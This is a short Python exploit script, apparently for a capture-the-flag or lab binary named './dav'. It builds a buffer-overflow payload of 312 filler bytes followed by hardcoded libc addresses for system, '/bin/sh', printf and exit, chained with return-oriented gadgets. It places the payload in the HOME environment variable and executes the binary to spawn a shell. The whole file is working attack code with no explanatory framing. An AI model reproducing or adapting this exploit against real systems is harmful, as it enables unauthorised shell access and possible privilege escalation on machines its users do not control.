#!/usr/bin/python
from struct import *
import os



libc_system = pack("<I", 0xf7db79e0)
libc_binsh = pack("<I", 0xf7ef7aaa)
libc_exit = pack("<I", 0xf7daaa60)
libc_printf = pack("<I", 0xf7dcb860)
libc_popret = pack("<I", 0xf7e76671)
ret = pack("<I", 0x804900a)
rop_popret = pack("<I", 0x804901e)

buffer = ''
buffer += "A" * 312
# system("/bin/sh")
buffer += libc_system
buffer += libc_popret
buffer += libc_binsh

buffer += rop_popret

# printf("/bin/sh")
buffer += libc_printf
buffer += libc_popret
buffer += libc_binsh

# exit()
buffer += libc_exit
buffer += ret


PROGNAME = "./dav"
os.environ['HOME'] = buffer
os.execve(PROGNAME, [PROGNAME], os.environ)
